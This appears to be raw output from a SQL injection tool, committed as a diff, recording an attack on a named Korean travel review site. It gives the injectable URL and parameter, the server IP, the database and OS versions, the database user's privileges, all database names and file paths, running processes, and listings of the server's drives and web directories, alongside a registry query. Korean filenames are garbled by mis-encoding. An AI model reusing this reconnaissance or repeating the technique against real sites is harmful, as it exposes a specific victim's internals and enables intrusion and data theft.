@@ -1,0 +1,714 @@
+■漏洞信息:============================================================
+ ·URL:http://review.nomad21.com/default.asp?score=0&kname=%5B%B5%B6%C0%CF%5D%B9%DA%B9%B0%B0%FC%20%C1%F6%B1%B8&cnt=6&insPage=over&mode=nView&pid=393&tableName=place&category=A07&city_code=DER
+ ·页面标题：⑵⑵⑵ 咯青磊啊 父靛绰 咯青府轰固叼绢 - [刀老]冠拱包 瘤备 (刀老) ⑵⑵⑵
+ ·参数:score=0&kname=%5B%B5%B6%C0%CF%5D%B9%DA%B9%B0%B0%FC%20%C1%F6%B1%B8&cnt=6&insPage=over&mode=nView&pid=393&tableName=place&category=A07&city_code=DER
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:221.143.50.136
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 07:57:44 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+P3P: CP='CAO PSA CONi OTR OUR DEM ONL'
+pragma: no-cache
+Content-Length: 123702
+Content-Type: text/html
+Expires: Mon, 04 Apr 2011 07:56:43 GMT
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:tourmall
+ ·版本:Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+取记录数失败，使用设定值：5
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+取记录数失败，使用设定值：5
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+取记录数失败，使用设定值：5
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+
+■数据库信息:============================================================
+- 数据库名：tourmall
+- 用户名：nomadtour
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：NOMAD21-COM
+- 服务名：MSSQLSERVER
+- 系统用户名：nomadtour
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+21segi	C:\Program Files\Microsoft SQL Server\MSSQL\Data\21segi_Data.MDF	
+bbs	C:\Program Files\Microsoft SQL Server\MSSQL\Data\bbs_Data.MDF	
+EuroPension	C:\Program Files\Microsoft SQL Server\MSSQL\Data\EuroPension_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+ndb_Travel_Inside	C:\Program Files\Microsoft SQL Server\MSSQL\data\ndb_Travel_Inside_Data.MDF	
+Nomad_mail	C:\Program Files\Microsoft SQL Server\MSSQL\Data\Nomad_mail.mdf	
+nomadAD	C:\Program Files\Microsoft SQL Server\MSSQL\data\nomadAD_Data.MDF	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+shopping	C:\Program Files\Microsoft SQL Server\MSSQL\Data\shopping_Data.MDF	
+singapore	C:\Program Files\Microsoft SQL Server\MSSQL\Data\singapore_Data.MDF	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+tourbbs	C:\Program Files\Microsoft SQL Server\MSSQL\Data\tourbbs_Data.MDF	
+tourmall	C:\Program Files\Microsoft SQL Server\MSSQL\Data\tourmall_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	NOMAD21-COM	2900	AWAITING COMMAND	SQL_START	
+SQLAgent - Alert Engine	sleeping	NOMAD21-COM	2900	AWAITING COMMAND	SQL_START	
+MS SQLEM	sleeping	NOMAD21-COM	4456	AWAITING COMMAND	Administrator	
+Microsoft㈢ Windows㈢ Operating System	sleeping	NOMAD21-COM	2692	AWAITING COMMAND		
+Microsoft㈢ Windows㈢ Operating System	sleeping	NOMAD21-COM	2692	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+NOMAD21-COM	SQL Server	SQLOLEDB	NOMAD21-COM		NOMAD21-COM	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+
+归诀磊丰\
+阂鞘夸磊丰\
+捞傈官帕拳搁\
+AQTRONIX WebKnight\
+DB_Backup\
+IIsLog\
+Mail_Backup\
+RECYCLER\
+System Volume Information\
+www\
+皋老拌沥 巩辑.txt
+SQL.txt
+
+Dir of D:\www: 
+
+00.Internet\
+21segi(备)\
+21segi\
+600.OtherService\
+nomadAD\
+nomadAfri\
+nomadThai\
+
+Dir of D:\www\nomadThai: 
+
+www\
+www2008\
+弃歹鼻茄汲沥.txt
+
+Dir of D:\www\nomadThai\www: 
+一次性获取失败，正在批次获取……
+
+aspnet_client\
+bbs\
+images\
+img_golf\
+img_hotel\
+img_tour\
+Include\
+lib\
+manage\
+member\
+newBoard\
+product\
+Top_Menu\
+w3c\
+iws.asp
+mainMenu.asp
+nomadThai.asp
+nomadThai_back20090722.asp
+nomadThai_LeftMenu.asp
+nomadThai_Test.asp
+nomadThaxxi.asp
+subPage.asp
+subPage_Air.asp
+subPage_Board.asp
+subPage_Car.asp
+subPage_Car_Show.asp
+subPage_Golf.asp
+subPage_Golf_Show.asp
+subPage_Hotel.asp
+subPage_Hotel_Show.asp
+subPage_Notice.asp
+subPage_Notice_cxlRule.asp
+subPage_Notice_infoThai.asp
+subPage_Notice_resvRule.asp
+subPage_Reservation.asp
+subPage_Reservation_Show.asp
+subPage_Reservation_Show_Car.asp
+subPage_Reservation_Show_Golf.asp
+subPage_Reservation_Show_Hotel.asp
+subPage_Reservation_Show_Tour.asp
+subPage_Resv.asp
+subPage_Rev_Proc.asp
+subPage_Tour.asp
+subPage_Tour_Show.asp
+subPage_Zzim.asp
+subPage_Zzim_Proc.asp
+subPage_Zzim_Step01.asp
+subPage_Zzim_Step02.asp
+subPage_Zzim_Step02_Car.asp
+subPage_Zzim_Step02_Golf.asp
+subPage_Zzim_Step02_Hotel.asp
+subPage_Zzim_Step02_Tour.asp
+subPage_Zzim_Step03.asp
+
+Dir of C:: 
+一次性获取失败，正在批次获取……
+
+AGSCash\
+AGSPay15\
+Documents and Settings\
+Inetpub\
+PerfLogs\
+Program Files\
+RECYCLER\
+System Volume Information\
+WINDOWS\
+wmpub\
+wwwRoot\
+arpstatic.bat
+AUTOEXEC.BAT
+CONFIG.SYS
+eula.1028.txt
+eula.1031.txt
+eula.1033.txt
+eula.1036.txt
+eula.1040.txt
+eula.1041.txt
+eula.1042.txt
+eula.2052.txt
+eula.3082.txt
+globdata.ini
+install.exe
+install.ini
+install.res.1028.dll
+install.res.1031.dll
+install.res.1033.dll
+install.res.1036.dll
+install.res.1040.dll
+install.res.1041.dll
+install.res.1042.dll
+install.res.2052.dll
+install.res.3082.dll
+msizap.exe
+net.txt
+net2.txt
+VC_RED.cab
+VC_RED.MSI
+vcredist.bmp
+
+Dir of C:\wwwRoot: 
+
+80.Nomad\
+Temp\
+
+Dir of C:\wwwRoot\80.Nomad: 
+
+10.PR_Project\
+20.svc.nomad21.com\
+50.Repinion\
+51.traBlog\
+60.wService\
+府乔聪攫 颇老诀肺靛包访.txt
+
+Dir of C:\wwwRoot\80.Nomad\50.Repinion: 
+一次性获取失败，正在批次获取……
+
+admin\
+aspnet_client\
+bbs\
+count\
+EuroZine\
+gnInclude\
+gnMember\
+images\
+img_banner\
+img_cusReview\
+img_t\
+img\
+inc\
+info\
+JwEditor\
+lib\
+new_2006\
+new_2008\
+nmd_Connection\
+RSS_Guide\
+rvComm\
+rvDome\
+rvGene\
+rvInfo\
+rvMember\
+rvOver\
+Top_Menu\
+TraBlog\
+w3c\
+府乔聪攫累己吝_HTML林狼荤亲.txt
+刚历 佬绢焊技夸.txt
+cus_rvWrite.asp
+cus_rvWrite_backup.asp
+cus_rvWrite_Step1.asp
+default.asp
+default.nmd
+default_20060313.asp
+gn_Default.asp
+gn_pageBottom.asp
+gn_pageTop(070825).asp
+gn_pageTop.asp
+gn_pageTop_00.asp
+gn_pageTop_071006.asp
+index.asp
+index.html
+main_SearchAll.asp
+main_SearchAll.nmd
+Nomad_pageBottom.asp
+Nomad_pageTop.asp
+notice_080720.html
+pageBottom.nmd
+pageTop.nmd
+pop670.htm
+rv_place_inup.asp
+rv_place_review.asp
+sub.asp
+sub_generalinfo_List.asp
+sub_generalinfo_View.asp
+subList.asp
+trablog荐沥荤亲.txt
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+Dir of C:\wwwRoot\80.Nomad\20.svc.nomad21.com: 
+
+aspnet_client\
+cp_new\
+include\
+nomad\
+repinion\
+default.asp
+
+Dir of C:\wwwRoot\Temp: 
+
+
+Dir of C:\Inetpub: 
+
+20110123\
+AdminScripts\
+ETC\
+ftproot\
+image\
+mailroot\
+wwwroot\
+抗距磊.XLS
+
+Dir of C:\Inetpub\wwwroot: 
+
+100.NomadService\
+20.Align_Page\
+images\
+imsi\
+info\
+italiatblog\
+NAUS\
+noMade\
+nomadThai\
+nomadViet\
+rv_image\
+shop_images\
+shop_upload\
+tour\
+tourddanzi\
+Nomad_Notice.htm
+www.nomad21.com.url
+
+Dir of C:\Inetpub\wwwroot\shop_upload: 
+一次性获取失败，正在批次获取……
+
+[1][1]DSCN1674.jpg
+[1][1]spider.gif
+[1]_transparent.gif
+[1]01(5).jpg
+[1]01.jpg
+[1]02.jpg
+[1]03.jpg
+[1]1 copy.jpg
+[1]1.jpg
+[1]100_2231.JPG
+[1]11.jpg
+[1]122_2270.jpg
+[1]16.jpg
+[1]18_logo.gif
+[1]2.jpg
+[1]200306100944050.gif
+[1]2004_09_30_11_40_50.gif
+[1]3.jpg
+[1]傍亲滚胶.jpg
+[1]扁郴侥.jpg
+[1]丑矫固.jpg
+[1]钢档.jpg
+[1]葛扁.jpg
+[1]公措府_扁盒亮酒.jpg
+[1]牢玫傍亲.jpg
+[1]钱巩10.jpg
+[1]钱巩15.jpg
+[1]钱巩16.jpg
+[1]钱巩17.jpg
+[1]钱巩18.jpg
+[1]钱巩19.jpg
+[1]钱巩4.jpg
+[1]钱巩6.jpg
+[1]钱呼扼 钱.jpg
+[1]侵赴 厚摹 啊绰辨.jpg
+[1]侵赴 厚摹1.jpg
+[1]侵赴 厚摹2.jpg
+[1]侵赴 厚摹3.jpg
+[1]侵赴 厚摹4.jpg
+[1]bohol.jpg
+[1]CIMG1893.JPG
+[1]clubmalaysia.jpg
+[1]d3m.gif
+[1]DSC00705.jpg
+[1]DSC01550.jpg
+[1]DSC09217.JPG
+[1]DSC09845.JPG
+[1]DSCN0160.JPG
+[1]DSCN0160-copy.jpg
+[1]DSCN1674.JPG
+[1]DSCN16741.jpg
+[1]icon_home.gif
+[1]kota.jpg
+[1]photo_101901_vietnam.jpg
+[1]photo_101902_vietnam.jpg
+[1]photo_101906_vietnam.jpg
+[1]photo_101907_vietnam.jpg
+[1]photo_101908_vietnam.jpg
+[1]PICT0161.jpg
+[1]sellandia.jpg
+[1]sellandia_0624.jpg
+[1]Snap3.gif
+[1]spider.gif
+[1]zyrx.swf
+[10]_transparent.gif
+[2][1]DSCN1674.jpg
+[2][1]spider.gif
+[2]_transparent.gif
+[2]01.jpg
+[2]02.jpg
+[2]03.jpg
+[2]1.jpg
+[2]100_2231.JPG
+[2]傍亲滚胶.jpg
+[2]丑矫固.jpg
+[2]钢档.jpg
+[2]d3m.gif
+[2]DSCN1674.JPG
+[2]kota.jpg
+[2]PICT0161.jpg
+[2]sellandia_0624.jpg
+[3][1]DSCN1674.jpg
+[3][1]spider.gif
+[3]_transparent.gif
+[3]丑矫固.jpg
+[3]d3m.gif
+[4][1]DSCN1674.jpg
+[4]_transparent.gif
+[4]d3m.gif
+[5]_transparent.gif
+[5]d3m.gif
+[6]_transparent.gif
+[7]_transparent.gif
+[8]_transparent.gif
+[9]_transparent.gif
+___;.gif
+_transparent.gif
+002_nana.jpg
+01(5).jpg
+01.jpg
+012_myungdong.jpg
+02.jpg
+022_donggang.jpg
+026_jeju.jpg
+03.jpg
+032_jeju.jpg
+04_.jpg
+041227.jpg
+042_starbucks.jpg
+06.jpg
+1 copy.jpg
+1.jpg
+1.txt
+10 copy.jpg
+100_1850.JPG
+100_2230.JPG
+100_2231.JPG
+100B2180.JPG
+100B2182.JPG
+1016_1958_1.jpg
+105_0532.JPG
+105_0570.JPG
+105_0579.JPG
+106_0616.JPG
+106_0622.JPG
+106_0652.JPG
+11.jpg
+110_1067.JPG
+111_1112.JPG
+111_1113.JPG
+111_1144.JPG
+112_1231.JPG
+122_2270.jpg
+122_2296.jpg
+122_2298.jpg
+122_2299.jpg
+123_2386-1.jpg
+124_2446-1.jpg
+124_2450-1.jpg
+124_2458-1.jpg
+124_2460-1.jpg
+124_2460-1[2].jpg
+125_2512-1.jpg
+125_2535-1.jpg
+125_2539-1.jpg
+126_2625-1.jpg
+126_2630-1.jpg
+126_2638-1.jpg
+126_2682-1.jpg
+127_2722-1.jpg
+127_2787-1.jpg
+128_2826-1.jpg
+128_2851-1.jpg
+128_2876-1.jpg
+142045_sc399[1].jpg
+16.jpg
+174.jpg
+18.jpg
+18_logo.gif
+19.jpg
+2.jpg
+20.jpg
+200306100944050.gif
+2004_09_30_11_40_50.gif
+200591113310_.jpg
+25.jpg
+2-5.jpg
+27 copy.jpg
+27.jpg
+3.jpg
+3-20.jpg
+3-24.jpg
+3-3.jpg
+4 copy.jpg
+4.jpg
+4-8.jpg
+5.jpg
+56.jpg
+9 copy.jpg
+傍亲滚胶.jpg
+傍亲滚胶1.jpg
+惫郴急 傍亲没荤.jpg
+惫郴急 扁郴侥.jpg
+惫郴急厚青扁.jpg
+惫荐.jpg
+弊赴噶绊.jpg
+扁郴侥.jpg
+掺扼厚1.jpg
+丑矫固.jpg
+档厘.gif
+饭霸凄.jpg
+饭胶配尔.jpg
+付荤瘤.jpg
+钢档.jpg
+葛扁.jpg
+公措府_扁盒亮酒.jpg
+规嫩俊绢傀捞令.jpg
+硅救 葛嚼.jpg
+何困.jpg
+厚摹1.jpg
+厚摹3.jpg
+呼扼 冯.jpg
+呼扼冯.jpg
+呼扼垮角.jpg
+荤公捞 傍亲.jpg
+荤柳 037.jpg
+荤柳9.JPG
+荤柳91.jpg
+急馒厘.jpg
+急馒厘1.jpg
+急馒厘2.jpg
+己怕.JPG
+荐康厘.jpg
+酒轿~.JPG
+郡4.jpg
+勘扁窍飘而聪促[1].ぞぞ 欺吭绢夸 ぞぞ.jpg
+牢玫傍亲.jpg
+霖勘捞.jpg
+氓倒捞.jpg
+免涝惫脚绊辑.jpg
+内尝府 凯瞒1.jpg
+内尝府凯瞒.jpg
+其绢窍快胶.jpg
+钱巩1.jpg
+钱巩10.jpg
+钱巩12.jpg
+钱巩14.jpg
+钱巩15.jpg
+钱巩16.jpg
+钱巩17.jpg
+钱巩18.jpg
+钱巩19.jpg
+钱巩2.jpg
+钱巩20.jpg
+钱巩21.jpg
+钱巩22.jpg
+钱巩23.jpg
+钱巩24.jpg
+钱巩3.jpg
+钱巩4.jpg
+钱巩5.jpg
+钱巩6.jpg
+钱巩7.jpg
+钱巩8.jpg
+钱巩9.jpg
+钱呼扼 钱.jpg
+钱呼扼具版.jpg
+侵赴 厚摹 啊绰辨.jpg
+侵赴 厚摹1.jpg
+侵赴 厚摹2.jpg
+侵赴 厚摹3.jpg
+侵赴 厚摹4.jpg
+雀傈_DSC01680.JPG
+a_001_main1.jpg
+a_001_sub1.jpg
+aaa.bmp
+AirAsia.jpg
+banana.jpg
+big lagoon tour.jpg
+board_no_image.gif
+bohol.jpg
+borasurfing.jpg
+c.para 3.jpg
+Capture12.gif
+CIMG1882.JPG
+CIMG1892.JPG
+CIMG1893.JPG
+CIMG1897.JPG
+clubmalaysia.gif
+clubmalaysia.jpg
+d3m.gif
+date-18.gif
+date-19.gif
+ddanzi.jpg
+dorarong.jpg
+DSC00011.jpg
+DSC00167.jpg
+DSC00440.JPG
+DSC00498.jpg
+DSC00594.jpg
+DSC00705.jpg
+DSC01070.jpg
+DSC01302.JPG
+DSC01550.jpg
+DSC03419.jpg
+DSC04050-1.jpg
+DSC04051-1.jpg
+DSC06828.jpg
+DSC07092.jpg
+DSC07093.jpg
+DSC08341.jpg
+DSC08777.jpg
+DSC09121.jpg
+DSC09217.JPG
+DSC09845.JPG
+DSC09845-1.jpg
+DSC09849.JPG
+DSCN0160.JPG
+DSCN0222.JPG
+DSCN0240.JPG
+DSCN0241.JPG
+DSCN0242.JPG
+DSCN0243[1].jpg
+DSCN0248.JPG
+DSCN0324.JPG
+Dscn0886.jpg
+DSCN1052.JPG
+DSCN1242.JPG
+DSCN1400.JPG
+DSCN1674.JPG
+DSCN2927.JPG
+DSCN2929.JPG
+DSCN4967.jpg
+DSCN8981.JPG
+DSCN8984.JPG
+DS
+Dir of C:\Inetpub\wwwroot\info: 
+
+highway\
+prepare\
+
